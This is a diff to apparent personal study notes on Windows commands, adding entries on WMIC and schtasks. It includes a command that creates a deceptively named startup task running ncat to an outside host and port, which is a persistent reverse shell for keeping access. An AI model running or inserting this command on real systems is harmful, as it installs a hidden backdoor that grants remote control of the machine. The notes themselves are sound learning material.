@@ -54,7 +54,12 @@ basic commands:
 		- there are also commands like stop, start
 		- you can also configure a service using the command config like 'sc config {service_name} {config to be changed}= {value to change it to}', again specific spacing is important.
 	- tasklist => show all processes running on the pc, with flag /SVC can show all services associated with the processes
-	
+	- WMIIC => can be used to get an extremely large amount of information about the machine and sometimes even other hosts on the network
+	- schtasks =>  Used to manage scheduled tasks, can be used to guarantee we keep access on a machine or even to increase privileges in some cases where tasks might run as the SYSTEM user
+		- /Query can be used to show info on on existing scheduled tasks, specially with the /V flag for verbose output
+		- /Create is used to create new tasks, one simple example would be 'schtasks /create /sc ONSTART /tn "CompletelyHarmlessTask" /tr "C:\Users\MyUser\AppData\Roaming\ncat.exe 10.10.10.10 4444"'
+		- /Change is used to update a task
+		- /Delete to delete tasks
 
 
 env variables can be referenced using %{variable name}%, to get he info we can 'echo' the variable or do 'set %{variable name}%'
